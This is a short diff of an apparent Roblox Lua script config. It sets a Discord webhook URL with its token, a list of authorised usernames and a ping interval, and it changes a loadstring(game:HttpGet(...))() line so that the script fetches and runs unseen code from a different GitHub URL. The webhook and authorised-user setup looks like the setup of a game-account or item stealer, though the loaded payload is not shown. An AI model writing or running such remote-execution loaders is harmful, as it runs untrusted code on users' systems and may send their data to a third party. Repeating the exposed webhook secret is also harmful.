@@ -2,4 +2,4 @@ Webhook = "https://discord.com/api/webhooks/1438225541038870674/rFiQw_6Gyj9Jj1qB
 AuthorisedUsers = {"JustFoxzz, Jidion.ig"}
 Ping = "10m"
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Spv-Script/voxium/refs/heads/main/sab'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/hmmm/refs/heads/main/Visual1"))()
